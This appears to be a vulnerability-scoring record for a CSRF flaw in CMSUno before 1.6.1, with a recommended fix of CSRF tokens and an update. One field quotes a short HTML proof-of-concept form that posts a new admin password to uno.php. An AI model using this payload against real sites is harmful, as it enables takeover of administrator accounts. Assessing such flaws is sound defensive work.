proposal.summary: CMSUno before 1.6.1 (uno.php) is vulnerable to Cross-Site Request Forgery (CSRF) that allows changing the admin password via a crafted POST request.
proposal.cwe_quote: uno.php allows CSRF to change the admin password.

AV.quote: uno.php allows CSRF to change the admin password.

UI.quote:
PoC :

<html>
<body>
<script>history.pushState(",",'/')</script>
<form action=“http://127.0.0.1/cmsuno-master/uno.php”method=“POST”>
<input type=“hidden” name=“user” value=“admin”/>
<input type=“hidden” name=“pass” value=“yourpassword”/>
<input type=“submit” name=“user” value=“Submit request”/>
</form>
</body>
</html>

C.quote: uno.php allows CSRF to change the admin password.

I.quote: uno.php allows CSRF to change the admin password.

proposal.recommended_next_step: Verify the vulnerable endpoint uno.php and implement CSRF protection (e.g., per-request CSRF tokens) and require authentication for password changes; notify users to update to 1.6.1.
